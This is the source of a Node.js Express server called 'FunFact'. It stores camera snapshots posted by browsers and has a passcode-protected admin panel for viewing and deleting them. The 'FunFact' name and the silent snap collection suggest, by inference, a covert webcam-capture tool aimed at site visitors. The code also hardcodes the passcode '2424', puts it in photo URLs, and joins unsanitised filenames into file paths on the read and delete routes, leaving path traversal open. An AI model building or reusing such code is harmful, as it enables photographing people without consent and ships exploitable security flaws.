const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Multer storage config
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadsDir),
  filename: (req, file, cb) => {
    const timestamp = Date.now();
    const ext = file.mimetype === 'image/png' ? '.png' : '.jpg';
    cb(null, `snap_${timestamp}${ext}`);
  }
});
const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } });

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '5mb' }));

// Upload endpoint - receives base64 image from camera
app.post('/api/snap', (req, res) => {
  try {
    const { image } = req.body;
    if (!image) return res.status(400).json({ error: 'No image data' });

    // Strip data URL prefix
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    const filename = `snap_${Date.now()}.jpg`;
    const filepath = path.join(uploadsDir, filename);

    fs.writeFileSync(filepath, buffer);
    console.log(`📸 Snap saved: ${filename}`);
    res.json({ success: true });
  } catch (err) {
    console.error('Upload error:', err);
    res.status(500).json({ error: 'Failed to save' });
  }
});

// Admin API - get all photos (requires passcode)
app.post('/api/admin/photos', (req, res) => {
  const { passcode } = req.body;
  if (passcode !== '2424') {
    return res.status(401).json({ error: 'Invalid passcode' });
  }

  try {
    const files = fs.readdirSync(uploadsDir)
      .filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f))
      .map(f => {
        const stat = fs.statSync(path.join(uploadsDir, f));
        return {
          name: f,
          url: `/api/admin/photo/${f}?code=2424`,
          date: stat.mtime.toISOString(),
          size: stat.size
        };
      })
      .sort((a, b) => new Date(b.date) - new Date(a.date));

    res.json({ photos: files, count: files.length });
  } catch (err) {
    res.status(500).json({ error: 'Failed to read photos' });
  }
});

// Serve individual photo (protected)
app.get('/api/admin/photo/:filename', (req, res) => {
  if (req.query.code !== '2424') {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  const filepath = path.join(uploadsDir, req.params.filename);
  if (!fs.existsSync(filepath)) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.sendFile(filepath);
});

// Delete photo
app.delete('/api/admin/photo/:filename', (req, res) => {
  const { passcode } = req.body;
  if (passcode !== '2424') {
    return res.status(401).json({ error: 'Invalid passcode' });
  }
  const filepath = path.join(uploadsDir, req.params.filename);
  if (fs.existsSync(filepath)) {
    fs.unlinkSync(filepath);
    res.json({ success: true });
  } else {
    res.status(404).json({ error: 'Not found' });
  }
});

// Delete all photos
app.post('/api/admin/clear', (req, res) => {
  const { passcode } = req.body;
  if (passcode !== '2424') {
    return res.status(401).json({ error: 'Invalid passcode' });
  }
  const files = fs.readdirSync(uploadsDir).filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f));
  files.forEach(f => fs.unlinkSync(path.join(uploadsDir, f)));
  res.json({ success: true, deleted: files.length });
});

app.listen(PORT, () => {
  console.log(`\n🎉 FunFact server running at http://localhost:${PORT}`);
  console.log(`🔐 Admin panel at http://localhost:${PORT}/admin.html\n`);
});
